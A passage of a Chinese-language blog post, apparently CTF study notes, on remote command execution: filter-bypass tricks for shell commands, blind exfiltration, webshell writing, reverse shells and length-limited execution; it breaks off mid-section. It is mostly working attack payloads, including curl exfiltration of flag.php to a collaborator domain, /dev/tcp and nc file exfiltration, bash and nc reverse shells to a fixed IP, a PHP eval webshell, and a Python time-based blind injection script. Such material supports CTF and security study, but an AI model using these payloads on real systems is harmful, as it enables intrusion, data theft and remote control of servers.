<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>通过黑名单的方式 ban 掉了一些关键的命令、字符或者文件名</p>
<ul>
<li><p>空字符：</p>
<p>在Shell中，<code>&#39;</code> 和 <code>&quot;</code> 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串</p>
<p>例如：<code>echo &quot;$&quot;a</code> 会输出 <code>$a</code>，而 <code>echo $a</code> 会输出变量 <code>a</code> 的值，当只有 <code>&quot;&quot;</code> 则表示空字符串，Shell会忽略它</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">who</span><span class="token string">""</span>ami
<span class="token function">who</span><span class="token string">'a'</span>mi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>反斜杠：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">who<span class="token punctuation">\</span>ami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>通配符：见上面的 linux 通配符</p>
</li>
<li><p>过滤空格：</p>
<ul>
<li><p>$IFS：结合上面环境变量的字段分隔，于是就有<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code></p>
</li>
<li><p>重定向：&lt;</p>
</li>
<li><p>{}：仅bash生效</p>
</li>
<li><p>进制编码：空格的十六进制为 \x20</p>
</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/flag
cat<span class="token operator">&lt;</span>/flag
<span class="token punctuation">&#123;</span>cat,/flag<span class="token punctuation">&#125;</span>
<span class="token string">$'cat<span class="token entity" title="\x20">\x20</span>/flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>过滤 &#x2F;：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>0<span class="token operator">:</span>1&#125;</span>来替代<span class="token string">"/"</span>：
<span class="token function">cat</span> /flag ----<span class="token operator">>></span><span class="token operator">></span> <span class="token function">cat</span> <span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>0<span class="token operator">:</span>1&#125;</span>flag

<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'!-0'</span> <span class="token string">'"-1'</span><span class="token variable">)</span></span> 来替代<span class="token string">"/"</span>：
<span class="token function">cat</span> <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'!-0'</span> <span class="token string">'"-1'</span><span class="token variable">)</span></span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



</li>
<li><p>换行符：在linux中，命令中插入<strong>换行符</strong>不影响实际的命令执行，如：这里<code>echo Cg==|base64 -d</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">who</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token assign-left variable">Cg</span><span class="token operator">==</span><span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span class="token variable">`</span></span>ami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同理我们可以构造<code>who$9ami</code>、<code>who%09ami</code>（web端进行url解码时可用）等</p>
<p>同样能起到类似效果的还有 <code>%00</code>（NULL字符）、<code>%0d</code>（回车符，仅限web端传入，终端无效），<code>%09</code>（tab制表符）</p>
</li>
<li><p>编码绕过：<code>cat /flag</code> 的多种写法</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">'L2ZsYWc='</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span class="token variable">)</span></span>"</span>
<span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span class="token variable">`</span></span>
<span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IC9mbGFn"</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>

<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> 636174202f666c6167 <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">|</span> <span class="token function">bash</span>  <span class="token comment"># 十六进制</span>
<span class="token string">$'<span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x67">\x67</span>'</span> <span class="token comment"># 十六进制</span>
<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\143">\143</span><span class="token entity" title="\141">\141</span><span class="token entity" title="\164">\164</span><span class="token entity" title="\040">\040</span><span class="token entity" title="\057">\057</span><span class="token entity" title="\146">\146</span><span class="token entity" title="\154">\154</span><span class="token entity" title="\141">\141</span><span class="token entity" title="\147">\147</span><span class="token entity" title="\012">\012</span>"</span><span class="token variable">)</span></span>  <span class="token comment"># 八进制（or bashfuck）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>赋值给变量进行拼接：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">a</span><span class="token operator">=</span>l<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span>
<span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>f<span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span>lag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$&#123;c&#125;</span><span class="token variable">$&#123;d&#125;</span>
<span class="token assign-left variable">a</span><span class="token operator">=</span>“ccaatt”<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token variable">$&#123;a<span class="token operator">:</span>0<span class="token operator">:</span>1&#125;</span><span class="token variable">$&#123;a<span class="token operator">:</span>2<span class="token operator">:</span>1&#125;</span><span class="token variable">$&#123;a<span class="token operator">:</span>4<span class="token operator">:</span>1&#125;</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<hr>
<h3 id="环境变量结合通配符盲匹配"><a href="#环境变量结合通配符盲匹配" class="headerlink" title="环境变量结合通配符盲匹配"></a>环境变量结合通配符盲匹配</h3><p>在无数字和小写字母的情况下，尝试构造 <code>/bin/base64 flag.php</code></p>
<p>首先的思路就是用通配符进行构造： <code>/???/???? ????.???</code></p>
<p>靶机的部分环境变量如下：</p>
<p><strong>PATH</strong>：&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</p>
<p><strong>PWD</strong>：&#x2F;var&#x2F;www&#x2F;html</p>
<p><strong>USER</strong>：www-data</p>
<p><strong>HOME</strong>：当前用户的主目录，www-data 一般在 &#x2F;var&#x2F;www</p>
<p><strong>SHLVL</strong>：记录多个 Bash 进程实例嵌套深度的累加器，此处为 1</p>
<p><strong>PHP_VERSION</strong>：7.3.22</p>
<blockquote>
<p>此处防止博客渲染失败使用了tab分隔，不过直接复制也不影响命令执行</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">PATH</span><span class="token operator">:</span>~0&#125;</span>或<span class="token variable">$&#123;<span class="token environment constant">PATH</span><span class="token operator">:</span>~A&#125;</span>
获取字符n（0和字母都代表从最后面数）
<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>~0&#125;</span>
获取字符l
<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>0&#125;</span>
/var/www/html
<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>1&#125;</span>
var/www/html
<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>2<span class="token operator">:</span>4&#125;</span><span class="token punctuation">(</span>第三位是长度<span class="token punctuation">)</span>
ar/w

<span class="token variable">$&#123;	<span class="token operator">#</span>	&#125;</span>
获取数字0
<span class="token variable">$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span>或<span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span>或<span class="token variable">$&#123;	<span class="token operator">#</span>?	&#125;</span>
获取数字1
<span class="token variable">$&#123;	PHP_VERSION<span class="token operator">:</span>~A	&#125;</span>
从7.3.22中获取数字2
<span class="token variable">$&#123;	<span class="token operator">#</span>IFS	&#125;</span><span class="token operator">=</span><span class="token number">3</span>
linux下是3，mac里是4
<span class="token variable">$&#123;	<span class="token operator">#</span>RANDOM	&#125;</span>
获取4或5

对于 / ,上面的获取方式 <span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>0<span class="token operator">:</span>1&#125;</span>
可构造 <span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">##</span>	&#125;</span><span class="token punctuation">&#125;</span>或<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span><span class="token punctuation">&#125;</span>
过滤<span class="token comment">#时</span>
构造 <span class="token operator">&lt;</span>A<span class="token punctuation">;</span><span class="token variable">$&#123;	HOME<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span>???<span class="token variable">$&#123;	HOME<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span>?????<span class="token variable">$&#123;	RANDOM<span class="token operator">:</span><span class="token operator">:</span>$?	&#125;</span> ????.???
<span class="token punctuation">(</span><span class="token operator">&lt;</span>A<span class="token punctuation">;</span>让前面报错得到1，使<span class="token variable">$?</span>为1<span class="token punctuation">)</span> /bin/base64 flag.php


<span class="token variable">$&#123;<span class="token environment constant">USER</span><span class="token operator">:</span>~A&#125;</span>
获取a
<span class="token variable">$&#123;<span class="token environment constant">HOME</span><span class="token operator">:</span>$&#123;	<span class="token operator">#</span>HOSTNAME	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">#</span>SHLVL	&#125;</span><span class="token punctuation">&#125;</span>
获取t
<span class="token variable">$&#123;<span class="token environment constant">PWD</span><span class="token operator">:</span>$&#123;<span class="token operator">#</span>IFS	&#125;</span><span class="token builtin class-name">:</span><span class="token variable">$&#123;	<span class="token operator">#</span>?	&#125;</span><span class="token punctuation">&#125;</span>
获取r
构造/bin/rev逆序读取文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="Linux无回显命令执行"><a href="#Linux无回显命令执行" class="headerlink" title="Linux无回显命令执行"></a>Linux无回显命令执行</h2><p>php中，如 exec 之类的函数执行命令无回显，此时需要想办法获取执行的结果</p>
<h3 id="dnslog带外"><a href="#dnslog带外" class="headerlink" title="dnslog带外"></a>dnslog带外</h3><p>关于多级域名与域名解析DNS的概念：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37263637/article/details/85157611">https://blog.csdn.net/m0_37263637/article/details/85157611</a></p>
<p>如：tieba.baidu.com 是一个三级域名，com 为顶级域名，baidu 为二级域名，tieba 即为三级域名，之间用点号隔开，域名不区分大小写</p>
<p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20250418091906523.png" alt="image-20250418091906523"></p>
<p>利用 burp 中的 Collaborator Client</p>
<p>使用curl指令进行带外，反引号进行内联执行把结果作为参数值带出</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://k9u5p3u5hn9tl61hux77y81ad1jt7i.oastify.com

<span class="token function">curl</span> http://k9u5p3u5hn9tl61hux77y81ad1jt7i.oastify.com?a<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> / <span class="token operator">|</span> base64<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20230717131213534.png" alt="image-20230717131213534"></p>
<p>相当于对这个域名进行了一次带参数的访问，其中参数的内容是我们命令执行的结果</p>
<hr>
<h3 id="写入文件并下载"><a href="#写入文件并下载" class="headerlink" title="写入文件并下载"></a>写入文件并下载</h3><blockquote>
<p>ctfshow web136</p>
</blockquote>
<p>把命令执行的结果写文件然后访问下载文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> / <span class="token operator">|</span> <span class="token function">tee</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样可以把<code>ls /</code>的结果输出写入到当前目录下的 1 文件，然后如果是php服务的话就可以尝试访问获取结果</p>
<p>或者直接重定向写入文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> / <span class="token operator">></span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果遇到我们想要的回显内容在命令的报错中的情况：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span> error.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以存所有输出：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">></span> all.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="大文件情况"><a href="#大文件情况" class="headerlink" title="大文件情况"></a>大文件情况</h3><p>双方均有 nc ：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">4444</span> <span class="token operator">></span> out.file

<span class="token function">nc</span> <span class="token operator">&lt;</span>攻击者IP<span class="token operator">></span> <span class="token number">4444</span> <span class="token operator">&lt;</span> bigfile.iso<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>无 nc：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">4444</span> <span class="token operator">></span> data.jar
<span class="token function">cat</span> bigfile.tar.gz <span class="token operator">></span> /dev/tcp/<span class="token operator">&lt;</span>攻击者IP<span class="token operator">></span>/4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>无 &#x2F;dev&#x2F;tcp：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将大文件切割为 1MB 一个的小块</span>
<span class="token function">split</span> <span class="token parameter variable">-b</span> 1m large_file chunk_
<span class="token function">cat</span> chunk_* <span class="token operator">></span> large_file_restored<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> /f*<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>爆破匹配的字符即可</p>
<p>时间盲注，脚本by <a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi">Kradress</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment">#__author__: 颖奇L'Amore www.gem-love.com</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time <span class="token keyword">as</span> t
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote <span class="token keyword">as</span> urlen
url  <span class="token operator">=</span> <span class="token string">'http://1c288549-6ed6-481e-9941-073a0889da5d.challenge.ctf.show/?c='</span>
alphabet <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span>

result <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">for</span> char <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>
		payload <span class="token operator">=</span> <span class="token string">"if [ ` ls / | awk 'NR==4'  |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>char<span class="token punctuation">)</span> <span class="token comment">#flag.php</span>
		<span class="token comment"># payload = "if [ `cat /f149_15_h3r3 | awk 'NR==1' |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi".format(i,char)</span>
		<span class="token comment"># data = &#123;'cmd':payload&#125;</span>
		<span class="token keyword">try</span><span class="token punctuation">:</span>
			start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>
			<span class="token comment"># r = requests.post(url, data=data)</span>
			end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> start
			<span class="token comment"># print(i,char)</span>
			<span class="token keyword">if</span> end <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>		
				result <span class="token operator">+=</span> char
				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
				<span class="token keyword">break</span>
		<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload部分：</p>
<ul>
<li><code>ls /</code>：列出 <code>/</code> 目录下的所有文件和目录。</li>
<li><code>awk &#39;NR==4&#39;</code>：选取输出结果中的第四行（前三个文件一般都是bin dev etc）</li>
<li><code>cut -c&#123;&#125;</code>：选取该行中的第 <code>i</code> 个字符。</li>
<li><code>=</code>：比较该字符是否等于当前字符。</li>
<li><code>sleep 5</code>：如果比较成功，则等待 5 秒钟。</li>
</ul>
<hr>
<h3 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>['cmd']);?>"</span> <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>极限情况：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497580&idx=1&sn=c77028340ad979d0182045d5796a3826&subscene=0">https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&amp;mid=2247497580&amp;idx=1&amp;sn=c77028340ad979d0182045d5796a3826&amp;subscene=0</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">"60<span class="token entity" title="\n">\n</span>37<span class="token entity" title="\n">\n</span>111<span class="token entity" title="\n">\n</span>117<span class="token entity" title="\n">\n</span>116<span class="token entity" title="\n">\n</span>46<span class="token entity" title="\n">\n</span>112<span class="token entity" title="\n">\n</span>114<span class="token entity" title="\n">\n</span>105<span class="token entity" title="\n">\n</span>110<span class="token entity" title="\n">\n</span>116<span class="token entity" title="\n">\n</span>40<span class="token entity" title="\n">\n</span>34<span class="token entity" title="\n">\n</span>49<span class="token entity" title="\n">\n</span>34<span class="token entity" title="\n">\n</span>41<span class="token entity" title="\n">\n</span>59<span class="token entity" title="\n">\n</span>37<span class="token entity" title="\n">\n</span>62<span class="token entity" title="\n">\n</span>"</span> <span class="token operator">></span> /xxxxx/1.txt
<span class="token function">awk</span> <span class="token string">'&#123; printf "%c", $1 &#125;'</span> /xxxxx/1.txt <span class="token operator">></span> /xxxxx/1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<hr>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></p>
<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质</a></p>
<p>在线生成反弹shell命令：<a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a></p>
<p>常用：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/115.236.153.170/57746 0>&amp;1"</span>
<span class="token function">nc</span> <span class="token number">115.236</span>.153.170 <span class="token number">57746</span> <span class="token parameter variable">-e</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<hr>
<h2 id="Bash无字母数字命令执行"><a href="#Bash无字母数字命令执行" class="headerlink" title="Bash无字母数字命令执行"></a>Bash无字母数字命令执行</h2><p>探姬的集大成之作：<a target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">https://probiusofficial.github.io/bashFuck/</a></p>
<ul>
<li><p>八进制</p>
</li>
<li><p>二进制整数替换</p>
</li>
<li><p>数字1的特殊变量替换</p>
</li>
<li><p>数字0的特殊变量替换</p>
</li>
<li><p>特殊扩展替换任意数字</p>
</li>
</ul>
<hr>
<h2 id="极限长度命令执行"><a href="#极限长度命令执行" class="headerlink" title="极限长度命令执行"></a>极限长度命令执行</h2><h3 id="7字符"><a href="#7字符" class="headerlink" title="7字符"></a>7字符</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p>
<ul>
<li><code>w</code>是长度最短的命令，用于快速查看谁在登录系统以及他们在做什么，不过这里内容无关，只需要一个足够短的命令用于写入结果创建文件即可，我们关注的是文件名</li>
</ul>
<p>按照如下顺序创建文件：</p>
